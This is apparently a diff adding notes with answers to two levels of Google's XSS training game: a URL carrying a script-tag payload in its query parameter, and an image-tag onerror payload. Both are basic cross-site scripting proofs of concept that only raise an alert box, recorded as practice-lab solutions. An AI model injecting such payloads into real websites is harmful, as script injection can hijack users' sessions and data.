@@ -1,0 +1,4 @@
+
+Challenge 1: https://xss-game.appspot.com/level1/frame/?query=<script>alert(1)</script>
+
+Challenge 2: <img src=1 onerror=alert(1)>
